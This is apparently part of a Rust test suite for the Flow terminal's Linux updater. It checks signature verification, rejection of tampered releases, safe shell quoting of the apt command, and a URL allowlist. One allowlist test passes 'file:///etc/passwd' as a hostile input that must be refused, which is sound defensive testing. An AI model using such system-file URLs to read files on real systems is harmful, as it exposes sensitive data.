        assert!(matches!(unsigned, Err(UpdateError::NotSigned)));
        assert!(nothing_kept());
        // Signed, but another build than the feed names: refused, and its
        // part taken away.
        let wrong = fetch_deb(&release("other.deb", other.len(), sign(&other)), &public(&key), &downloads, file);
        assert!(matches!(wrong, Err(UpdateError::Install(ref e)) if e.contains("99999")), "{wrong:?}");
        assert!(nothing_kept());
        // The feed's own: kept whole, under its own name, over a file there.
        std::fs::create_dir_all(&downloads).unwrap();
        std::fs::write(downloads.join(file), b"an older download").unwrap();
        let path = fetch_deb(&release("good.deb", bytes.len(), sign(&bytes)), &public(&key), &downloads, file).unwrap();
        assert_eq!(path, downloads.join(file));
        assert_eq!(std::fs::read(&path).unwrap(), bytes);
        assert_eq!(std::fs::read_dir(&downloads).unwrap().count(), 1, "no part left beside it");
        // A release whose feed has no .deb has none to fetch.
        let none = Release { deb: None, ..release("good.deb", bytes.len(), sign(&bytes)) };
        assert!(matches!(fetch_deb(&none, &public(&key), &downloads, file), Err(UpdateError::Download(_))));
        let _ = std::fs::remove_dir_all(&root);
    }

    fn key() -> SigningKey {
        SigningKey::from_bytes(&[7u8; 32])
    }

    fn public(key: &SigningKey) -> String {
        STANDARD.encode(key.verifying_key().to_bytes())
    }

    #[test]
    fn an_install_needs_every_folder_it_writes_to_be_writable() {
        let prefix = std::env::temp_dir().join(format!("flow-writable-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&prefix);
        for dir in ["bin", "lib/flow-terminal/games", "share/applications", "share/icons/hicolor/64x64/apps"] {
            std::fs::create_dir_all(prefix.join(dir)).unwrap();
        }
        assert!(install_writable(&prefix));
        // Folders it would make count by the nearest one there is.
        std::fs::remove_dir_all(prefix.join("share/applications")).unwrap();
        assert!(install_writable(&prefix));
        // One it can't write, as a root install leaves the games, is enough
        // to stop it before anything is replaced.
        let mode = |dir: &str, m: u32| std::fs::set_permissions(prefix.join(dir), std::os::unix::fs::PermissionsExt::from_mode(m)).unwrap();
        mode("lib/flow-terminal/games", 0o555);
        // Root can write anywhere, so the test can only see this as a user.
        let as_root = writable(&prefix.join("lib/flow-terminal/games"));
        assert_eq!(install_writable(&prefix), as_root);
        mode("lib/flow-terminal/games", 0o755);
        mode("share/icons/hicolor/64x64/apps", 0o555);
        assert_eq!(install_writable(&prefix), as_root);
        mode("share/icons/hicolor/64x64/apps", 0o755);
        let _ = std::fs::remove_dir_all(&prefix);
    }

    #[test]
    fn only_flow_releases_own_pages_open() {
        let tag = "https://github.com/arcanii/Flow-releases/releases/tag/v0.1.23-linux";
        assert_eq!(page_for(Some(tag)), tag);
        for other in ["https://example.com/flow", "https://github.com/arcanii/Flow-releases/releasesX", "file:///etc/passwd", "https://github.com/arcanii/Flow-releases/releases/x y"] {
            assert_eq!(page_for(Some(other)), "https://github.com/arcanii/Flow-releases/releases", "{other}");
        }
        assert_eq!(page_for(None), "https://github.com/arcanii/Flow-releases/releases");
    }

    #[test]
    fn only_the_keys_own_signature_of_those_bytes_passes() {
        let key = key();
        let sig = STANDARD.encode(key.sign(b"release").to_bytes());
        assert!(signed(b"release", &sig, &public(&key)));
        assert!(!signed(b"releasf", &sig, &public(&key)));
        assert!(!signed(b"release", &sig, flow_core::UPDATE_PUBLIC_KEY));
        assert!(!signed(b"release", "not base64!", &public(&key)));
        assert!(!signed(b"release", &STANDARD.encode([0u8; 12]), &public(&key)));
    }

    /// A release laid out as package.sh lays one out, whose flow says it's
    /// `build`, with the repo's own install.sh.
    fn tarball(work: &Path, build: u64) -> Vec<u8> {
        let top = work.join("flow-9.9.9");
        for dir in ["bin", "lib/flow-terminal/games", "share/applications"] {
            std::fs::create_dir_all(top.join(dir)).unwrap();
        }
        let script = |path: PathBuf, body: String| {
            std::fs::write(&path, body).unwrap();
            std::fs::set_permissions(&path, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        };
        script(top.join("bin/flow"), format!("#!/bin/sh\necho 'Flow 9.9.9 (build {build})'\n"));
        script(top.join("lib/flow-terminal/games/flow-help"), "#!/bin/sh\n".into());
        std::fs::copy(Path::new(env!("CARGO_MANIFEST_DIR")).join("packaging/com.arcanii.Flow.desktop"), top.join("share/applications/com.arcanii.Flow.desktop")).unwrap();
        std::fs::copy(Path::new(env!("CARGO_MANIFEST_DIR")).join("scripts/install.sh"), top.join("install.sh")).unwrap();
        let out = work.join("release.tar.gz");
        assert!(Command::new("tar").arg("-czf").arg(&out).arg("-C").arg(work).arg("flow-9.9.9").status().unwrap().success());
        std::fs::read(out).unwrap()
    }

    fn feed(base: &str, build: u64, bytes: &[u8], signature: &str) -> Vec<u8> {
        format!(
            r#"<rss xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle"><channel><item>
<enclosure url="{base}/release.tar.gz" sparkle:version="{build}" sparkle:shortVersionString="9.9.9" sparkle:edSignature="{signature}" length="{}" type="application/octet-stream"/>
</item></channel></rss>"#,
            bytes.len()
        )
        .into_bytes()
    }

    #[test]
    fn a_program_put_in_place_by_another_shows_the_running_one_replaced() {
        let root = std::env::temp_dir().join(format!("flow-replaced-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        let program = root.join("sleep");
        std::fs::copy("/bin/sleep", &program).unwrap();
        // A child another test forks while the copy is open for writing holds
        // it until that child execs, and running it meanwhile fails as busy.
        let mut child = loop {
            match Command::new(&program).arg("30").spawn() {
                Err(e) if e.kind() == std::io::ErrorKind::ExecutableFileBusy => std::thread::sleep(std::time::Duration::from_millis(10)),
                spawned => break spawned.unwrap(),
            }
        };
        // spawn returns once the program has started in the child.
        let exe = PathBuf::from(format!("/proc/{}/exe", child.id()));
        assert_eq!(std::fs::read_link(&exe).unwrap(), program);
        assert!(!replaced_at(&exe), "the program on disk is the one running");
        // As install.sh does: the new one beside it, then moved over it.
        let new = root.join(".sleep.new");
        std::fs::copy("/bin/sleep", &new).unwrap();
        std::fs::rename(&new, &program).unwrap();
        let replaced = replaced_at(&exe);
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&root);
        assert!(replaced, "{:?}", std::fs::read_link(&exe));
        assert!(!replaced_at(Path::new("/proc/self/exe")), "the tests' own program is still in place");
    }

    #[test]
    fn a_signed_release_installs_over_flow_and_a_tampered_one_doesnt() {
        let root = std::env::temp_dir().join(format!("flow-updater-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let (work, prefix, temp) = (root.join("work"), root.join("prefix"), root.join("temp"));
        for d in [&work, &prefix, &temp] {
            std::fs::create_dir_all(d).unwrap();
        }
        let build = 99_999;
        let bytes = tarball(&work, build);
        let key = key();
        let signature = STANDARD.encode(key.sign(&bytes).to_bytes());
        let mut tampered = bytes.clone();
        *tampered.last_mut().unwrap() ^= 1;

        // Feed and tarball from one server, whose address goes in the feed.
        let good_base = serve_with(|base| vec![("/feed.xml".into(), feed(base, build, &bytes, &signature)), ("/release.tar.gz".into(), bytes.clone())]);
        let release = newest_release(&format!("{good_base}/feed.xml")).unwrap().expect("a release");
        assert_eq!(release.display(), "9.9.9 (build 99999)");
        assert!(matches!(newest_release(&format!("{good_base}/none.xml")), Err(e) if e.contains(std::env::consts::ARCH)));

        // A tampered download is turned away before anything is unpacked.
        let bad_base = serve_with(|base| vec![("/feed.xml".into(), feed(base, build, &tampered, &signature)), ("/release.tar.gz".into(), tampered.clone())]);
        let bad = newest_release(&format!("{bad_base}/feed.xml")).unwrap().unwrap();
        assert!(matches!(install_release(&bad, &prefix, &public(&key), &temp), Err(UpdateError::NotSigned)));
        assert!(!prefix.join("bin/flow").exists());
        // As is one signed by another key, Flow's own included.
        assert!(matches!(install_release(&release, &prefix, flow_core::UPDATE_PUBLIC_KEY, &temp), Err(UpdateError::NotSigned)));

        // A feed naming another build than the tarball's flow is refused.
        let wrong = Release { build: build + 1, ..release.clone() };
        let result = install_release(&wrong, &prefix, &public(&key), &temp);
        assert!(matches!(result, Err(UpdateError::Install(ref e)) if e.contains("99999")), "{result:?}");
        assert!(!prefix.join("bin/flow").exists());

        install_release(&release, &prefix, &public(&key), &temp).unwrap();
        let out = Command::new(prefix.join("bin/flow")).arg("--version").output().unwrap();
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "Flow 9.9.9 (build 99999)");
        assert!(prefix.join("lib/flow-terminal/games/flow-help").is_file());
        assert!(prefix.join("share/applications/com.arcanii.Flow.desktop").is_file());
        // Nothing left behind in the temporary folder.
        assert_eq!(std::fs::read_dir(&temp).unwrap().count(), 0);
        let _ = std::fs::remove_dir_all(&root);
    }

    /// The newest release the published feed names (or FLOW_TEST_FEED's),
    /// downloaded from where it says, checked with Flow's own key and
    /// installed into a scratch prefix, as an update would be, and its .deb
    /// fetched and checked where the feed carries one. It reaches
    /// GitHub, so it's left out unless asked for:
    /// `cargo test -p flow-linux updater -- --ignored`.
    #[test]
    #[ignore]
    fn the_published_release_installs_as_an_update_would() {
        let feed = std::env::var("FLOW_TEST_FEED").unwrap_or_else(|_| feed_url());
        let release = newest_release(&feed).unwrap().expect("a release in the feed");
        let root = std::env::temp_dir().join(format!("flow-published-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let (prefix, temp) = (root.join("prefix"), root.join("temp"));
        install_release(&release, &prefix, flow_core::UPDATE_PUBLIC_KEY, &temp).unwrap();
        let out = Command::new(prefix.join("bin/flow")).arg("--version").output().unwrap();
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), format!("Flow {}", release.display()));
        eprintln!("installed {} from {feed}", release.display());
        // Its .deb too, where the feed carries it, as a .deb's Flow takes it.
        if release.deb.is_some() {
            let path = fetch_deb(&release, flow_core::UPDATE_PUBLIC_KEY, &root.join("Downloads"), &deb_file(&release.version)).unwrap();
            eprintln!("and its .deb, checked: {}", path.display());
        }
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn a_deb_is_named_as_the_release_names_it() {
        let arch = match std::env::consts::ARCH {
            "x86_64" => "amd64",
            "aarch64" => "arm64",
            other => other,
        };
        assert_eq!(deb_file("0.1.25"), format!("Flow-0.1.25-linux-{arch}.deb"));
    }

    /// The command About gives for a .deb names the file, as the shell
    /// reads it back, wherever the downloads folder is.
    #[test]
    fn the_apt_command_names_the_downloaded_deb() {
        let home = Path::new("/home/someone");
        let cases = [
            ("/home/someone/Downloads/Flow-0.1.25-linux-amd64.deb", "~/Downloads/Flow-0.1.25-linux-amd64.deb"),
            ("/home/someone/ダウンロード/Flow-0.1.25-linux-amd64.deb", "~/ダウンロード/Flow-0.1.25-linux-amd64.deb"),
            ("/home/someone/Flow-0.1.25-linux-amd64.deb", "~/Flow-0.1.25-linux-amd64.deb"),
            ("/home/someone/My Downloads/Flow.deb", "'/home/someone/My Downloads/Flow.deb'"),
            ("/srv/it's here/Flow.deb", r"'/srv/it'\''s here/Flow.deb'"),
            ("/srv/downloads/Flow.deb", "/srv/downloads/Flow.deb"),
            ("Flow.deb", "./Flow.deb"),
        ];
        for (path, word) in cases {
            let command = apt_command(Path::new(path), Some(home));
            assert_eq!(command, format!("sudo apt install {word}"), "{path}");
            // What apt would be handed.
            let out = Command::new("sh").arg("-c").arg(format!("printf %s {word}")).env("HOME", home).output().unwrap();
            let named = String::from_utf8(out.stdout).unwrap();
            let expected = if path.starts_with('/') { path.to_string() } else { format!("./{path}") };
            assert_eq!(named, expected, "{command}");
        }
        assert_eq!(apt_command(Path::new("/tmp/Flow.deb"), None), "sudo apt install /tmp/Flow.deb");
    }

    /// Serves over HTTP on localhost, until the test ends, what `files`
    /// (paths and their bytes) makes of the server's own address.
    fn serve_with(files: impl FnOnce(&str) -> Vec<(String, Vec<u8>)>) -> String {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let files = files(&base);
        std::thread::spawn(move || {
            for stream in listener.incoming().flatten() {
                answer(stream, &files);
            }
        });
        base
    }

    fn answer(stream: std::net::TcpStream, files: &[(String, Vec<u8>)]) {
        let mut reader = BufReader::new(stream.try_clone().unwrap());
        let mut line = String::new();
        let _ = reader.read_line(&mut line);
        let path = line.split_whitespace().nth(1).unwrap_or("/").to_string();
        loop {
            let mut h = String::new();
            if reader.read_line(&mut h).unwrap_or(0) == 0 || h == "\r\n" {
                break;
            }
        }
        let mut stream = stream;
        match files.iter().find(|(p, _)| *p == path) {
            Some((_, body)) => {
                let _ = write!(stream, "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n", body.len());
                let _ = stream.write_all(body);
            }
            None => {
                let _ = write!(stream, "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
            }
        }
    }
}
